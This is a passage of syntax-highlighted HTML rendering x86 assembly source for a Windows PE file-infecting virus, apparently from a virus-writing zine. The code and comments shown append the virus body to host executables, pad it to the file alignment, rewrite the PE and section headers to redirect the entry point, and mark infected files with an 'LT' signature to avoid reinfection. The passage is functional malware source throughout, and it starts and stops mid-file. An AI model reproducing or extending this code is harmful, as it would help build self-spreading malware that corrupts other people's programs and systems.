        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;this is how much we are</span><span class="sc0">
                                        </span><span class="sc1">;writing with the buffer</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Vsize</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">;fix the image size</span><span class="sc0">

</span><span class="sc1">;ok write the virus out to the file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Viruslen</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OrginIP</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get what we are writing</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileWrite</span><span class="sc0">                       </span><span class="sc1">;write this to the end</span><span class="sc0">

</span><span class="sc1">;now write the oldip out to the file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                           </span><span class="sc1">;we want to write the</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                         </span><span class="sc1">;old ip at the end of the </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">OldIP</span><span class="sc0">                       </span><span class="sc1">;virus</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileWrite</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;write the padding out to the file to bring it up to specs for the</span><span class="sc0">
</span><span class="sc1">; file alignment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">400400h</span><span class="sc0">                     </span><span class="sc1">;some random bytes to flesh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Vsize</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;it out</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Viruslen</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileWrite</span><span class="sc0">

        </span><span class="sc1">;ok we need to fix the PE header and Section Header now</span><span class="sc0">
        </span><span class="sc1">;first get last section header</span><span class="sc0">
        </span><span class="sc1">;section hdr size       = 28h</span><span class="sc0">
        </span><span class="sc1">;pe size                = f8h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cwde</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">028h</span><span class="sc0">

        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;points to the header</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;esi = last section header</span><span class="sc0">
                                </span><span class="sc1">;which the virus should be in</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3d8h</span><span class="sc0">
        </span><span class="sc6">jg</span><span class="sc0">      </span><span class="sc5">errorInfect</span><span class="sc0">

        </span><span class="sc1">;first set new eip  Vaddress +  VsizeRawData</span><span class="sc0">
        </span><span class="sc1">;eip</span><span class="sc0">
        </span><span class="sc1">;ptr to raw data </span><span class="sc0">
 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SRCH</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;size of the exe</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;file align is 3ch</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        
         
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc0">                     </span><span class="sc1">;SAVES THE ODD PART OF THE FILE</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; ptr to raw data</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

        
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;size of raw data </span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">;size of section</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;left over from file</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;padding at end of file</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc0">                     </span><span class="sc1">;ADD THE DIFFRENCE TO THE FILE</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EBX</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc5">filler</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;fix image size</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Size of raw data</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc5">filler</span><span class="sc4">]</span><span class="sc0"> 
         
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;sets up the eip</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Vsize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc5">filler</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;fix Vsize</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;fix size raw data</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">20000020h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'TL'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">BUFFER</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;move pointer start of file</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">     </span><span class="sc5">FileSeek</span><span class="sc0">                </span><span class="sc1">;to update header</span><span class="sc0">



        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">                        </span><span class="sc1">;we want to write the</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                         </span><span class="sc1">;old ip at the end of the </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">BUFFER</span><span class="sc0">                      </span><span class="sc1">;virus</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileWrite</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">


        

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">errorInfect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;eax = the distance from the start end existing</span><span class="sc0">
</span><span class="sc1">; we want to move pointer</span><span class="sc0">

</span><span class="sc5">FileSeek</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                         </span><span class="sc1">;from where do we seek</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;high dword of where we search to</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">;low dword</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FleHdle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Seek</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">FileClose</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FleHdle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Pass in ecx amount we want to read</span><span class="sc0">
</span><span class="sc1">;               edx where to write it too</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc5">FileWrite</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                         </span><span class="sc1">;needed to set to null (0)</span><span class="sc0">
                                                </span><span class="sc1">;for our needs</span><span class="sc0">

        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Readin</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;this will hold how many</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;bytes actualy written</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;how many bytes</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;buffer to read data from</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FleHdle</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;file handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Write</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;call the Read api</span><span class="sc0">

                                                </span><span class="sc1">;if no prob then eax = true 1</span><span class="sc0">
                                                </span><span class="sc1">;else set to 0 for false</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;set z if problem</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;CheckFile routine will open file</span><span class="sc0">
</span><span class="sc1">;get pe header location and check if already infected</span><span class="sc0">
</span><span class="sc1">;returns 0 if problem</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CheckFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">OpenIt</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">                          </span><span class="sc1">;if -1 no good</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ChError</span><span class="sc0">
        </span><span class="sc1">; ok file is open handle is saved in FleHdle</span><span class="sc0">
        </span><span class="sc1">; now the viruses needs to read in 1k if the file</span><span class="sc0">
        </span><span class="sc1">; check for PE and infection set the MZ checksum to</span><span class="sc0">
        </span><span class="sc1">; LT for the Turmoil Zine</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">             </span><span class="sc1">;buffer size</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">BUFFER</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">ReadFile</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ChError</span><span class="sc0">

        </span><span class="sc1">;file header is now in virus BUFFER</span><span class="sc0">
        </span><span class="sc1">;check for MZ</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">BUFFER</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ChError</span><span class="sc0">

        </span><span class="sc1">;ok check for PE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">BUFFER</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cwde</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">BUFFER</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PElocation</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'EP'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ChError</span><span class="sc0">

        </span><span class="sc1">;oops almost forgot check for LT</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">BUFFER</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'TL'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ChError</span><span class="sc0">

        </span><span class="sc1">;check for files that do not start at </span><span class="sc0">
        </span><span class="sc1">; 400000h </span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;IMAGE BASE</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">400000H</span><span class="sc0"> 
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ChError</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">;make sure eax != 0</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ChError</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">Ret</span><span class="sc0">


</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">ReadFile</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;       Pass in ecx amount we want to read</span><span class="sc0">
</span><span class="sc1">;               edx where to write it too</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
         
 
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                         </span><span class="sc1">;useless to virii</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Readin</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;howmany bytes read in</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;try to read this many bytes</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">;to here</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FleHdle</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; this file handle        </span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Read</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;call the api</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;if problem set z</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------------------------</span><span class="sc0">
 


</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">OpenIt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;tries to  open the file if it can the eax = the handle</span><span class="sc0">
</span><span class="sc1">; otherwise eax = -1 (ffffffff )</span><span class="sc0">
</span><span class="sc1">;thats all it does</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000003</span><span class="sc0">                        </span><span class="sc1">;existing file</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0c0000000h</span><span class="sc0">                      </span><span class="sc1">;R/W </span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SRCH</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;location of file name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;in the win95 finddata</span><span class="sc0">
